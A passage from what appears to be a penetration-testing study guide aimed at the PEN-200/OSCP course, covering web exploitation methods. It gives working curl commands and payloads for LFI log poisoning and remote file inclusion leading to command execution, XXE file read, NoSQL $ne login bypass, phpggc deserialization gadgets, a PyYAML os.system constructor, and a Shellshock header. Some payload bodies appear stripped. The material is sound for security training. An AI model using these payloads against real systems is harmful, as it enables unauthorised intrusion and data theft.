printf '%s' 'BASE64_DATA' | base64 -d ``` > **Prerequisite:** a PHP file-inclusion sink that accepts the wrapper. The encoded output must decode to target source; a normal rendered page means the wrapper did not disclose source in that context. ### 7. Worked example — hypothetical Observation: direct inclusion renders a page. Test: request its base64-filtered source. Illustrative output: the decoded result contains database connection logic. Interpretation: follow the credential and use source to map the actual sink. ### 8. Verify the result Decode the response and identify real target source; normal HTML rendering does not prove source disclosure. ### 9. Failure and fallback Wrapper filtering, missing path or a non-PHP read operation can defeat this route; retain ordinary traversal/source-disclosure evidence separately. ### 10. User-Agent=LOG_CANARY ``` **Recognize this detail:** The include/read identity can reach a log containing your controlled input; evaluation and payload preservation still need proof. **Still missing before method selection:** Separate raw file read from interpreter evaluation, confirm exact file path and encoding, then a minimal command effect. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Controlled log bytes are evaluated and the bounded identity proof succeeds: use the inclusion-execution chain. | | Ruled out in this context | The log is only served as inert text: rule out execution through this reader while retaining file disclosure. | | Inconclusive | No marker may mean a different log, buffered writes or escaped content; inspect configuration before changing payloads. | **If you do not yet have this clue:** start with [Disclose PHP source through an inclusion wrapper](web-exploitation.md#web-php-source). ### 3. Prerequisites **Starting access:** A reproducible application request and a controlled input or access-context comparison. **Required conditions:** Controlled content survives logging; inclusion identity can read it; interpreter evaluates it; requested command facility is available. ### 4. Discover and verify prerequisites ```bash curl -skG --data-urlencode 'page=/var/log/apache2/access.log' http://TARGET:PORT/index.php ``` ### 5. Why it works LFI alone selects a local file. Execution requires that included bytes be interpreted as code; source displayed as text proves a weaker primitive. Data-wrapper and remote-include variants below have additional URL-inclusion and routing prerequisites. ### 6. Execute and choose variants ```bash curl -sk -A '' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` > **Prerequisites:** the controlled header is logged, the web identity can read the exact log, the inclusion sink evaluates PHP and the payload survives encoding. On Windows/XAMPP, investigate application-specific paths such as `C:\xampp\apache\logs\access.log`. > **Decisive output:** the unique command output and target execution identity. If code appears as text, only read/inclusion is proven.
Variant — PHP data wrapper ```bash PAYLOAD=$(printf '%s' '' | base64 -w0) curl -skG --data-urlencode "page=data://text/plain;base64,$PAYLOAD" --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` Requires URL inclusion in the sink and PHP `allow_url_include=On`; it is disabled by default in current PHP configurations.
Variant — remote file inclusion ```bash python3 -m http.server TRANSFER_PORT --bind LHOST curl -skG --data-urlencode 'page=http://LHOST:TRANSFER_PORT/check.php' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` Requires remote URL inclusion, a compatible interpreter and target-to-`LHOST:TRANSFER_PORT` reachability. An absent HTTP request is inconclusive until reachability and filtering are separated.

Illustrative output: the second request returns the target execution identity. Interpretation: command execution is proven; map the session path. ### 8. Purpose and result Verified application-server command execution. ### 2. File or command effects depend on the actual engine, sandbox and exposed objects. ### 6. Execute and choose variants Use when controlled text appears inside a server-rendered template, email preview or report. Replay the real parameter and session. These are separate probes, not one universal payload: ```bash # Jinja/Twig-style expression probe curl -sS -G --data-urlencode 'name={{7*7}}' http://TARGET:PORT/PATH # A different delimiter family, only when the first is literal or errors suggest it curl -sS -G --data-urlencode 'name=${7*7}' http://TARGET:PORT/PATH # Jinja-versus-Twig clue; interpret alongside source/errors, not in isolation curl -sS -G --data-urlencode "name={{7*'7'}}" http://TARGET:PORT/PATH ``` Read: changed, repeatable computed output compared with a literal control supports evaluation. `49` alone does not identify the engine. Jinja commonly repeats the string; Twig commonly treats it numerically. Confirm the engine/version and exposed objects before selecting a file-read or command primitive. Literal reflection → inspect another template/input boundary; a syntax error alone does not prove an exploitable expression. Sources: [upstream 1](https://portswigger.net/web-security/server-side-template-injection). ### 7. Worked example — hypothetical Observation: a preview renders controlled input. Test: compare a literal control and two delimiter families. Illustrative output: one expression computes while the others remain literal. Interpretation: narrow the engine before choosing a primitive. ### 8. Verify the result Require repeatable computed output and corroborating engine clues; the value 49 alone does not identify the engine. ### 9. Failure and fallback Literal output rejects that syntax in the tested sink; a syntax error can be a parser clue but is not exploitation proof. ### 10. Next transitions [Prove visible or blind operating-system command injection](web-exploitation.md#web-command); [Read files through directory traversal](web-exploitation.md#web-traversal); [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ## Use an XML parser's external-entity behavior for bounded file read **Blocks:** 4. [Operational procedure](../../reference/03-initial-access/03-command-and-sql-injection.md#xxe--test-the-xml-parser-and-file-read-result) | [Quick sheet](../../cheatsheets/web-exploitation.md) ### 1. Purpose and result A verified parser-side file read or a precisely bounded blind parser/network effect. ### 2. Recognition clues A working XML request reaches a server-side parser that accepts a controlled document or field. #### Find the clue from your starting access **Where to investigate:** Start from a valid XML request and place an external-entity reference in a field whose parsed value is returned. **Discovery action — reference example:** ```bash curl -i -b cookies.txt -H 'Content-Type: application/xml' --data-binary @xxe.xml http://TARGET:PORT/PATH ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Response field: recognizable local system-file bytes ``` **Recognize this detail:** The server parser resolved the entity and read the selected file under its process identity. **Still missing before method selection:** Repeat with a benign control and preserve the exact parser/content-type context. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Recognizable content or a uniquely correlated parser event appears: use the bounded file/network primitive. | | Ruled out in this context | The parser rejects DTDs/entities: reject that entity path in this configuration. | | Inconclusive | Echoed XML or a generic parser error does not establish entity resolution. | **If you do not yet have this clue:** start with [Map functions, roles and normal requests manually](web-mapping.md#web-behavior). ### 3. Prerequisites **Starting access:** A reproducible application request and a controlled input or access-context comparison. **Required conditions:** External entity or XInclude processing is enabled and the parser identity can read the selected file. ### 4. Discover and verify prerequisites ```bash curl -i -b cookies.txt -H 'Content-Type: application/xml' --data-binary @xxe.xml http://TARGET:PORT/PATH ``` ### 5. Why it works The application must parse and resolve the entity; reflected XML, client-side parsing or DTD text alone does not establish file access. ### 6. Execute and choose variants Use a working XML request and put the entity reference in a field whose parsed value is returned. Retain the original wrapper, cookies and endpoint. Example body for an XML-compatible endpoint: ```xml ]> &probe; ``` ```bash curl -i -b cookies.txt -H 'Content-Type: application/xml' \ --data-binary @xxe.xml http://TARGET:PORT/PATH ``` Read: recognizable file content in the parsed field proves read access; echoing the submitted XML does not. Choose a platform-appropriate file; Windows can use `file:///C:/Windows/win.ini`. DTD rejection or unresolved entities → check the parser's actual configuration, not more traversal depth. If the application builds XML around your input and processes XInclude, a separate condition can exist without control over the document's DOCTYPE: ```xml ``` A blind endpoint needs an observable parser/network effect before any exfiltration claim. Follow verified config/source reads into credential or application testing. Sources: [upstream 1](https://portswigger.net/web-security/xxe). ### 7. Worked example — hypothetical Observation: an endpoint accepts XML and returns a parsed field. Test: place a local-file entity in that field. Illustrative output: recognizable system-file bytes appear. Interpretation: file read is proven under the parser identity. ### 8. Verify the result Require recognizable file content or a uniquely correlated parser-side event, not an echoed request. ### 9. Failure and fallback DTD rejection, unresolved entities or no network effect rules out only that parser/configuration route; preserve the working XML baseline. ### 10. Next transitions [Classify the artifact and its identity context](credentials.md#credential-classify); [Inspect source, backups, configuration and repository artifacts](web-mapping.md#web-artifacts); [Use server-side requests to inspect reachable internal behavior](web-exploitation.md#web-ssrf). ## Test structured NoSQL operator injection with identity controls **Blocks:** 4. [Operational procedure](../../reference/03-initial-access/03-command-and-sql-injection.md#nosql-operator-injection--separate-json-objects-from-strings) | [Quick sheet](../../cheatsheets/web-exploitation.md) ### 1. Purpose and result A verified query or authentication transition with a known resulting identity. ### 2. Recognition clues A login or search accepts JSON/nested form properties and evidence suggests an operator-based document query. #### Find the clue from your starting access **Where to investigate:** Capture the real JSON or nested-form login/search request and compare a wrong scalar, operator object and operator-as-string. **Discovery action — reference example:** ```bash curl -i -c cookies.txt -H 'Content-Type: application/json' --data '{"username":"USER","password":{"$ne":""}}' http://TARGET:PORT/LOGIN ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Protected profile after request: USER ``` **Recognize this detail:** A structured operator changed the query and produced an authenticated state for the named identity. **Still missing before method selection:** Verify protected access and identity; ensure the framework parsed an object rather than a string. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The operator object alone yields the intended verified transition: select the NoSQL method. | | Ruled out in this context | Schema/type validation rejects objects or the password is compared outside the query: reject that route. | | Inconclusive | A 200 response, cookie or changed error without protected access remains inconclusive. | **If you do not yet have this clue:** start with [Map functions, roles and normal requests manually](web-mapping.md#web-behavior). ### 3. Prerequisites **Starting access:** A reproducible application request and a controlled input or access-context comparison. **Required conditions:** The framework preserves an attacker-controlled operator object and the query uses it without rejecting its type. ### 4. Discover and verify prerequisites ```bash curl -i -c cookies.txt -H 'Content-Type: application/json' --data '{"username":"USER","password":{"$ne":""}}' http://TARGET:PORT/LOGIN ``` ### 5. Why it works An operator object and a string containing operator text are different inputs. A changed response must be tied to query behavior and authenticated state. ### 6. Execute and choose variants Use when a login/search accepts structured JSON or nested form parameters and evidence suggests a MongoDB-style query. Start with a normal failed request, then change one value's type. ```bash # A known username with an operator-valued password curl -i -c cookies.txt -H 'Content-Type: application/json' \ --data '{"username":"USER","password":{"$ne":""}}' http://TARGET:PORT/LOGIN # Distinct context: a form parser that expands bracketed properties curl -i -c cookies.txt --data-urlencode 'username=USER' \ --data-urlencode 'password[$ne]=x' http://TARGET:PORT/LOGIN ``` Read: compare against the same operator encoded as a plain string and against a known wrong password. Confirm the resulting identity through a protected route. A 200/login page or changed error is not authenticated access. Type validation, hashing the supplied password before querying, or removal of `$` operators can rule out this route. Broader `$ne` username queries may select an unexpected first account; keep the intended identity explicit. Sources: [upstream 1](https://portswigger.net/web-security/nosql-injection). ### 7. Worked example — hypothetical Observation: a JSON login accepts nested objects. Test: compare wrong password, operator object and operator-as-string. Illustrative output: only the object yields access as the named user. Interpretation: confirm that identity and map its rights. ### 8. Verify the result Verify a protected action and resulting identity; a 200 status or cookie alone is not authentication. ### 9. Failure and fallback Schema/type validation, password pre-hashing or operator filtering can reject the route; do not broaden to an unintended first account. ### 10. Next transitions [Map functions, roles and normal requests manually](web-mapping.md#web-behavior); [Cross role, function or session authorization boundaries](web-exploitation.md#web-authz); [Classify the artifact and its identity context](credentials.md#credential-classify). ## Match PHP deserialization gadgets to installed dependencies **Blocks:** 4. [Operational procedure](../../reference/03-initial-access/03-command-and-sql-injection.md#php-deserialization--match-the-gadget-to-installed-dependencies) | [Quick sheet](../../cheatsheets/web-exploitation.md) ### 1. Purpose and result A verified gadget effect in the application process context. ### 2. Recognition clues Source or request evidence shows controlled serialized PHP data reaches unsafe unserialize. #### Find the clue from your starting access **Where to investigate:** Use source, composer metadata and request format to establish unsafe PHP deserialization and loaded gadget classes before generating bytes. **Discovery action — reference example:** ```bash phpggc -l phpggc -i Monolog/RCE1 ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Source sink: unserialize(INPUT) Installed dependency: compatible Monolog release ``` **Recognize this detail:** The sink and loaded class family supply a gadget-chain candidate; generation alone is not execution. **Still missing before method selection:** Match exact version/vector, preserve serialized lengths/encoding and verify one benign effect. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | A compatible chain causes the intended effect: select that dependency-specific route. | | Ruled out in this context | Required classes are absent or allowed-class restrictions apply: reject that chain. | | Inconclusive | Unknown decoding or transport corruption must be resolved before interpreting a failed payload. | **If you do not yet have this clue:** start with [Map functions, roles and normal requests manually](web-mapping.md#web-behavior). ### 3. Prerequisites **Starting access:** A reproducible application request and a controlled input or access-context comparison. **Required conditions:** Required gadget classes and compatible dependency versions are loaded; transport preserves exact serialized bytes. ### 4. Discover and verify prerequisites ```bash phpggc -l phpggc -i Monolog/RCE1 phpggc -b Monolog/RCE1 system id > payload.b64 ``` ### 5. Why it works A generated gadget chain is dependency-specific. Base64 changes transport only and must match the application's decode path. ### 6. Execute and choose variants Use when a controlled serialized value reaches unsafe `unserialize()` and the required classes are loaded. Identify dependencies/builds from source or `composer.lock` first. ```bash # Inspect available families and the exact chain's version/vector requirements phpggc -l phpggc -i Monolog/RCE1 # Example function-call gadget, only when that chain matches the application phpggc -b Monolog/RCE1 system id > payload.b64 ``` Read: base64 is a transport choice, not a bypass—the sink must decode it before deserialization. Preserve raw serialized lengths and binary bytes; use the encoding that the real request expects. A generated payload is not execution proof. Missing classes, rejected object types or a different dependency version → choose a matching chain or another primitive. Verify a benign effect before selecting a shell payload. Sources: [upstream 1](https://github.com/ambionics/phpggc). ### 7. Worked example — hypothetical Observation: composer.lock and source show a compatible loaded chain and unsafe unserialize. Test: generate a minimal benign effect in the real transport. Illustrative output: the controlled effect occurs once. Interpretation: establish process identity before any session payload. ### 8. Verify the result Require the exact dependency/version, sink and attributable effect; successful payload generation proves none of these. ### 9. Failure and fallback Missing classes, allowed-class restrictions, length corruption or version mismatch defeats the chain; choose only an evidence-matched family. ### 10. Next transitions [Verify command execution, host and represented identity](sessions-transfers.md#session-proof); [Match a public exploit to the actual component and configuration](public-exploits.md#exploit-select); [Repair quoting, encoding and command-length boundaries](execution.md#execution-parser). ## Validate unsafe YAML object construction **Blocks:** 4. [Operational procedure](../../reference/03-initial-access/03-command-and-sql-injection.md#unsafe-yaml-construction--distinguish-loading-from-safe-parsing) | [Quick sheet](../../cheatsheets/web-exploitation.md) ### 1. Purpose and result A verified command or object-construction effect in the loader process. ### 2. Recognition clues Source or errors identify server-side Python YAML loading of controlled content. #### Find the clue from your starting access **Where to investigate:** Inspect source/errors for the actual Python YAML loader before placing a constructor in the application's required schema. **Discovery action — reference example:** ```yaml !!python/object/apply:os.system ["id"] ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Loader evidence: unsafe loader Effect: command-specific identity output ``` **Recognize this detail:** The application constructed the selected Python object under an unsafe loader. **Still missing before method selection:** Confirm loader/version and an attributable effect in the real import/request path. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Unsafe construction is confirmed: use only the required bounded effect. | | Ruled out in this context | ConstructorError under safe/restricted loading rejects this constructor route. | | Inconclusive | A .yml extension without loader evidence leaves the condition unknown. | **If you do not yet have this clue:** start with [Map functions, roles and normal requests manually](web-mapping.md#web-behavior). ### 3. Prerequisites **Starting access:** A reproducible application request and a controlled input or access-context comparison. **Required conditions:** The application uses an unsafe PyYAML loader that permits the selected Python object constructor. ### 4. Discover and verify prerequisites ```yaml !!python/object/apply:os.system ["id"] ``` ### 5. Why it works YAML syntax is not itself dangerous; the selected loader and allowed constructors define the capability. ### 6. Execute and choose variants Use when source or errors identify Python YAML processing with an unsafe loader and you control the loaded YAML. An ordinary JSON field or `yaml.safe_load()` does not supply this condition. ```yaml !!python/object/apply:os.system ["id"] ``` Put the probe in the actual YAML input/file, preserving its required surrounding structure. Read: attributable command output/effect supports unsafe construction. `ConstructorError` for the Python tag commonly indicates a loader that does not permit that constructor. Confirm the installed PyYAML version and loader (`UnsafeLoader`/unsafe load), rather than assuming that any use of YAML permits Python object execution. Sources: [upstream 1](https://github.com/yaml/pyyaml). ### 7. Worked example — hypothetical Observation: an import feature loads YAML and source names an unsafe loader. Test: submit the minimal constructor in the required surrounding schema. Illustrative output: a command-specific effect appears. Interpretation: verify the process context. ### 8. Verify the result Require source/configuration evidence for the loader and an attributable effect; a .yml extension is insufficient. ### 9. Failure and fallback ConstructorError often indicates safe or restricted loading. Preserve that negative evidence instead of trying unrelated tags blindly. ### 10. Next transitions [Verify command execution, host and represented identity](sessions-transfers.md#session-proof); [Repair quoting, encoding and command-length boundaries](execution.md#execution-parser); [Match a public exploit to the actual component and configuration](public-exploits.md#exploit-select). ## Test Shellshock only through a confirmed CGI-to-Bash chain **Blocks:** 4. [Operational procedure](../../reference/03-initial-access/03-command-and-sql-injection.md#shellshock-candidate--only-for-a-cgi-path-that-invokes-vulnerable-bash) | [Quick sheet](../../cheatsheets/web-exploitation.md) ### 1. Purpose and result A verified command effect under the CGI process identity. ### 2. Recognition clues A real CGI endpoint invokes Bash and component/patch evidence supports the vulnerable family. #### Find the clue from your starting access **Where to investigate:** Confirm a CGI endpoint, Bash invocation and vulnerable component evidence before sending one bounded header probe. **Discovery action — reference example:** ```bash curl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' http://TARGET:PORT/cgi-bin/SCRIPT ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text CGI response: uid=SERVICE_UID(...) gid=... ``` **Recognize this detail:** Command-derived identity output supports Shellshock execution under the CGI process. **Still missing before method selection:** Separate command output from reflected header text and record the exact script/Bash context. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The bounded command effect repeats only with the crafted environment function: select the route. | | Ruled out in this context | Patched Bash or a non-Bash CGI path produces no command effect: reject that chain. | | Inconclusive | A generic 500 or reflected payload leaves component behavior unresolved. | **If you do not yet have this clue:** start with [Map functions, roles and normal requests manually](web-mapping.md#web-behavior). ### 3. Prerequisites **Starting access:** A reproducible application request and a controlled input or access-context comparison. **Required conditions:** HTTP-derived environment data reaches an affected Bash process and the selected command is available. ### 4. Discover and verify prerequisites ```bash curl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' http://TARGET:PORT/cgi-bin/SCRIPT ``` ### 5. Why it works Shellshock abuses Bash environment-function parsing; it is not a generic header payload for arbitrary PHP, Java or static routes. ### 6. Execute and choose variants Use when a confirmed CGI endpoint passes HTTP-derived environment variables into an affected Bash process. An arbitrary PHP/Java route or a Bash version string alone does not establish this chain. ```bash # Bounded command-effect probe at the actual CGI script curl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' \ http://TARGET:PORT/cgi-bin/SCRIPT ``` Read: an attributable UID in the executed CGI response supports the effect; reflection of the header text does not. Header/CGI parsing errors require inspecting the request and script behavior. No effect → re-check the actual component and patch status before selecting another PoC. This is the CVE-2014-6271 family, not a generic command separator for every web input. Sources: [upstream 1](https://nvd.nist.gov/vuln/detail/CVE-2014-6271). ### 7. Worked example — hypothetical Observation: a CGI script and vulnerable Bash dependency are confirmed. Test: send one bounded identity command in a header. Illustrative output: the CGI response contains the target UID. Interpretation: command execution is proven. ### 8. Verify the result Require command-derived output distinct from reflected header text and record the CGI identity. ### 9. Failure and fallback No effect can mean patched Bash, non-Bash CGI, header sanitization or wrong endpoint; re-check the component before another payload. ### 10. Next transitions [Verify command execution, host and represented identity](sessions-transfers.md#session-proof); [Connect a Linux reverse shell through an available interpreter](sessions-transfers.md#session-reverse); [Match a public exploit to the actual component and configuration](public-exploits.md#exploit-select). ## Sources and shared concepts Supplied PEN-200 Ch 8–10 pp231–300. [Hexdump web modules](https://github.com/LeonardoE95/OSCP/tree/main/modules/web); [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/). Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.
